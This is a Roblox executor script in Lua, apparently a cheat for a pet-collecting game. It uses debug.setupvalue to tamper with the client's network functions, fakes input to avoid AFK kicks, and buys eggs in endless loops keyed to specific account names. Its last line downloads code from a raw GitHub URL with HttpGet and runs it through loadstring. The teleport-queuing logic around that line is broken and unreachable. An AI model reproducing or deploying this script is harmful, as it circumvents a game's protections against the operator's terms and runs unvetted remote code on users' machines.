if not game:IsLoaded() then
    game.Loaded:Wait()
end
print("A")
wait(2)
local Client = require(game.ReplicatedStorage.Library.Client)
local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
local Invoke, Fire = Network.Invoke, Network.Fire
debug.setupvalue(Client.Network.Invoke, 1, function() return true end)
debug.setupvalue(Client.Network.Fire, 1, function() return true end)
local Library = require(game:GetService("ReplicatedStorage"):WaitForChild("Framework"):WaitForChild("Library"))
local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
   wait(1)
   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)
if game.Players.LocalPlayer.Name == "BoriGHJIK_2" then
while task.wait() do
Invoke("Buy Egg","Golden Rock Egg",false,true) end
end
if game.Players.LocalPlayer.Name == "BoriGHJIK_22" then
while task.wait() do
Invoke("Buy Egg","Golden Rock Egg",true,false) end
else
while task.wait() do
Invoke("Buy Egg","Golden Rock Egg") end
end
local queueonteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
queueonteleport(loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripters221/script/main/GAporn"))())
